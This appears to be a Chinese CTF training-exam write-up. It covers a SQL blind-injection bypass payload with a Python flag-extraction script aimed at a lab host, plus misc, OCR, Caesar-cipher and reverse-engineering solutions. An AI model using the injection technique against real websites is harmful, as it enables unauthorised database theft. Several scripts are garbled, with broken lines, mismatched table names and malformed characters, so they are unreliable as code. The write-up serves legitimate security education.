---
title: 网络安全攻防培训第一期周五考试
draft: false
tags:
  - 安全
  - CTF
  - 考试
date: 2024-04-26
---

1. 签到题 web
   1. 目录扫描，发现网站源码
2. web 题
   1. SQL 注入的绕过和盲注，payload：`?id=1'anandd/**/if(ascii(substr((selselectect(flflagag)from(m1w63729alq1embcbd)),(position},1)) like/**/{mid},1,0)%23"`

    ```python
    import requests

    url = "<http://192.168.5.144:20188/>" res=""
    for i in range(1, 39):
    payload = "?id=1'anandd/**/if(ascii(substr((selselectect(flflagag)from(m1w637z9alq1embcbd)),{position},1)) like/**/{mid},1,0)%23"
    for j in range(32,127):
    r = requests.get(url = url + payload.format(position=i, mid=j)) if "SQLab" in r.text:
    res += chr(j)
    break print(res)
    ```

4. 杂项，文件
   1. `hex edit`，修复头部`504b` 为`zip`，解压获得`2.png`，修改 `jpg` 高度

5. 数表求乘积

   1. Python 脚本

```python
from PIL import Image, ImageEnhance  # pip install Pillow

import pytesseract  # pip install pytesseract
import re

# 定义函数,识别数表图片为二维数组列表

def image_to_matrix(image_path):
    # 打开并增强图像
    image = Image.open(image_path)
    image = ImageEnhance.Contrast(image).enhance(1.5).resize((1024, 768))

    # 使用 pytesseract 提取文本
    custom_config = r"--oem 3 --psm 6"
    text = pytesseract.image_to_string(image, config=custom_config)

    # 过滤不需要的字符
    filter_text = re.sub(r"[^\d\s]", "", text)

    # 将文本转换为矩阵
    matrix = [list(map(int, line.split())) for line in filter_text.strip().split("\n")]
    return matrix

# 定义函数找到序列的最大乘积

def find_max_prod(matrix, n):
    row_len, col_len = len(matrix), len(matrix[0])
    max_product = 0
    max_sequence = []

    for row in range(row_len):
        for col in range(col_len):
            # 检查所有四个可能的方向
            directions = [
                (0, 1),  # 水平
                (1, 0),  # 垂直
                (1, 1),  # 对角
                (1, -1),  # 反对角
            ]
            for dr, dc in directions:
                if (
                    0 <= col + dc * (n - 1) < col_len
                    and 0 <= row + dr * (n - 1) < row_len
                ):
                    product = 1
                    sequence = [matrix[row + i * dr][col + i * dc] for i in range(n)]
                    for num in sequence:
                        product *= num
                    if product > max_product:
                        max_product = product
                        max_sequence = sequence

    return max_sequence, max_product

# 数表图片转二维数组列表

matrix = image_to_matrix("file.jpg")

# 获取一条线上5个数的最大乘积和序列

max_sequence, max_product = find_max_prod(matrix, 5)

# 打印结果

print("最大乘积:", max_product)
print("具有最大乘积的序列:", max_sequence)
print("序列按照数字升序:", "".join(sorted("".join(map(str, max_sequence)))))

```

5. 密码学，凯撒密码

   ```plaintext
   来抓我呀~我一步就是 2 米远，你抓不着我~
   gofn\x84`AZ\x7f\x82\x8cZz\x80\x90\x80\x93g\x8a¤
   ```

   ```python
    key = "gofn\×84`AZ\x7f\x82\×8cZz\x80\x90\x80\x93g|x8a¤"
    flag="'"
    shift = 1

    for i in range (0,len (key)):
        flag = flag + chr(ord(key［i］)-shift)
        shift= shift+2

    print（flag）
   ```

6. 逆向题

   1. `main` 函数

   ```python
   key =［ 0x98,0x9E,0x93,0x99,0xAD,0x7B,0xA0,0xA0,0x97,0xA4,0x7E,0xA1,0xA0,0x99,0xA1,0x9E,Ox9B,0x93,0x91,0x84,0×77,OxAF］
   flag = ""

   for j in key:
       flag += chr(j-50）

   print(flag)
   ```
